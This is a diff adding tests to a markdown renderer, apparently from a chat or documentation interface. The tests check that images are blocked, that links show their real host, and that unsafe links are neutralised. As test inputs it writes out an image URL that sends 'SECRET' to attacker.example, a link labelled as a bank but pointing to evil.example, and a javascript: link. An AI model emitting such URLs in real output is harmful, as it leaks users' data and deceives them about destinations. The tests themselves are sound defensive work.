@@ -86,3 +86,36 @@ test("the code panel uses the shared icon set", () => {
   assert.match(html, /class="cb-copy"/);
   assert.match(html, /stroke-width="2"/);
 });
+
+/* --- Images and where links go -------------------------------------------- */
+
+test("a markdown image is never an <img>, and its address is not even shown", () => {
+  const html = md("![chart](https://attacker.example/?d=SECRET) und ![](https://a.example/x.png)");
+  assert.doesNotMatch(html, /<img\b/i);
+  assert.doesNotMatch(html, /attacker\.example|a\.example|SECRET/);
+  assert.match(html, /md-img-blocked[^>]*>\[image: chart\]</);
+  assert.match(html, /md-img-blocked[^>]*>\[image\]</);
+});
+
+test("an image is not turned into a link either, in a table cell or a list", () => {
+  for (const src of ["- ![x](https://e.example/?q=1)", "| a |\n|---|\n| ![x](https://e.example/?q=1) |"]) {
+    const html = md(src);
+    assert.doesNotMatch(html, /<img\b|href="https:\/\/e\.example/i, src);
+  }
+});
+
+test("a link shows its real destination next to its words", () => {
+  const html = md("[Zur Doku](https://www.docs.example.com/a?x=1&y=2)");
+  assert.match(html, /class="md-link-host"> \(docs\.example\.com\)</);
+  assert.match(html, /referrerpolicy="no-referrer"/);
+  assert.match(html, /rel="noopener noreferrer nofollow"/);
+});
+
+test("a link whose words name another site cannot hide where it goes", () => {
+  const html = md("[https://bank.example](https://evil.example/login)");
+  assert.match(html, /\(evil\.example\)/);
+});
+
+test("a neutralised link shows no destination", () => {
+  assert.doesNotMatch(md("[x](javascript:alert(1))"), /md-link-host/);
+});
